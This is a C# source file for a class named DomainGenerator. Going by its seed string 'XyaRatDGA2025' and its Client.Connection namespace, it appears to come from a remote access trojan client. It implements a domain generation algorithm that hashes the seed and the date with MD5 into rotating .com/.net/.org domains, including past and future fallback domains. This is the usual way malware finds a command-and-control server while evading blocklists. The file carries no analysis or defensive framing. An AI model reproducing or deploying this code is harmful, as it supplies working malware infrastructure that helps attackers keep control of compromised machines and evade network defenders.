using System;
using System.Security.Cryptography;
using System.Text;

namespace Client.Connection
{
    public static class DomainGenerator
    {
        private static readonly string[] tlds = { ".com", ".net", ".org", ".info", ".biz" };
        private static readonly string seed = "XyaRatDGA2025";

        public static string GenerateDomain(DateTime date)
        {
            try
            {
                string dateString = date.ToString("yyyyMMdd");
                string combined = seed + dateString;
                
                using (MD5 md5 = MD5.Create())
                {
                    byte[] hash = md5.ComputeHash(Encoding.UTF8.GetBytes(combined));
                    
                    StringBuilder domain = new StringBuilder();
                    for (int i = 0; i < 12; i++)
                    {
                        int charIndex = hash[i] % 26;
                        domain.Append((char)('a' + charIndex));
                    }
                    
                    int tldIndex = hash[12] % tlds.Length;
                    domain.Append(tlds[tldIndex]);
                    
                    return domain.ToString();
                }
            }
            catch
            {
                return null;
            }
        }

        public static string[] GenerateDomains(DateTime startDate, int count)
        {
            try
            {
                string[] domains = new string[count];
                for (int i = 0; i < count; i++)
                {
                    domains[i] = GenerateDomain(startDate.AddDays(i));
                }
                return domains;
            }
            catch
            {
                return new string[0];
            }
        }

        public static string[] GetTodayDomains()
        {
            try
            {
                DateTime today = DateTime.UtcNow.Date;
                return GenerateDomains(today, 5);
            }
            catch
            {
                return new string[0];
            }
        }

        public static string GetCurrentDomain()
        {
            try
            {
                return GenerateDomain(DateTime.UtcNow.Date);
            }
            catch
            {
                return null;
            }
        }

        public static string[] GetFallbackDomains()
        {
            try
            {
                DateTime today = DateTime.UtcNow.Date;
                string[] domains = new string[10];
                
                for (int i = 0; i < 5; i++)
                {
                    domains[i] = GenerateDomain(today.AddDays(-i));
                }
                
                for (int i = 0; i < 5; i++)
                {
                    domains[5 + i] = GenerateDomain(today.AddDays(i + 1));
                }
                
                return domains;
            }
            catch
            {
                return new string[0];
            }
        }
    }
}
